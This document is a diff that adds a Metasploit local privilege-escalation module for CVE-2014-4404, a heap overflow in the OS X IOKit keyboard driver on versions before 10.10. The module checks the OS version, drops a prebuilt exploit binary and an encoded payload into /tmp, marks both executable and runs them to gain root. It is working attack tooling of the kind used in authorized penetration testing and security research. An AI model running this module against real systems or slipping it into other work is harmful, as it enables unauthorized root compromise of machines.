@@ -1,0 +1,91 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'rex'
+
+class Metasploit3 < Msf::Exploit::Local
+  Rank = ManualRanking # Can cause kernel crash
+
+  include Msf::Post::File
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'          => 'Mac OS X IOKit Keyboard Driver Root Privilege Escalation',
+      'Description'   => %q{
+        A heap overflow in IOHIKeyboardMapper::parseKeyMapping allows kernel memory
+        corruption in Mac OS X before 10.10. By abusing a bug in the IORegistry, kernel
+        pointers can also be leaked, allowing a full kASLR bypass.
+
+        Tested on Mavericks 10.9.5, and should work on previous versions.
+
+        The issue has been patched silently in Yosemite.
+      },
+      'License'       => MSF_LICENSE,
+      'Author'        =>
+        [
+          'Ian Beer', # discovery, advisory, publication, and a most excellent blog post
+          'joev' # copy/paste monkey
+        ],
+      'References'    =>
+        [
+          [ 'CVE', '2014-4404' ],
+          [ 'URL', 'http://googleprojectzero.blogspot.com/2014/11/pwn4fun-spring-2014-safari-part-ii.html' ],
+          # Heap overflow:
+          [ 'URL', 'https://code.google.com/p/google-security-research/issues/detail?id=40' ],
+          # kALSR defeat:
+          [ 'URL', 'https://code.google.com/p/google-security-research/issues/detail?id=126' ]
+        ],
+      'Platform'      => 'osx',
+      'Arch'          => ARCH_X86_64,
+      'SessionTypes'  => [ 'shell', 'meterpreter' ],
+      'Targets'       => [
+        [ 'Mac OS X 10.9.5 Mavericks x64 (Native Payload)', { } ]
+      ],
+      'DefaultTarget' => 0,
+      'DisclosureDate' => 'Sep 24 2014'
+    ))
+  end
+
+  def check
+    if ver_lt(osx_ver, "10.10")
+      Exploit::CheckCode::Vulnerable
+    else
+      Exploit::CheckCode::Safe
+    end
+  end
+
+  def exploit
+    exploit_path = File.join(Msf::Config.install_root, 'data', 'exploits', 'CVE-2014-4404')
+    binary_exploit = File.read(File.join(exploit_path, 'key_exploit'))
+    binary_payload   = Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)
+    exploit_file = "/tmp/#{Rex::Text::rand_text_alpha_lower(12)}"
+    payload_file = "/tmp/#{Rex::Text::rand_text_alpha_lower(12)}"
+
+    print_status("Writing exploit file as '#{exploit_file}'")
+    write_file(exploit_file, binary_exploit)
+    register_file_for_cleanup(exploit_file)
+
+    print_status("Writing payload file as '#{payload_file}'")
+    write_file(payload_file, binary_payload)
+    register_file_for_cleanup(payload_file)
+
+    print_status("Executing payload...")
+    cmd_exec("chmod +x #{exploit_file}")
+    cmd_exec("chmod +x #{payload_file}")
+    cmd_exec("#{exploit_file} #{payload_file}")
+  end
+
+  def osx_ver
+    cmd_exec("sw_vers -productVersion").to_s.strip
+  end
+
+  def ver_lt(a, b)
+    Gem::Version.new(a) < Gem::Version.new(b)
+  end
+
+end
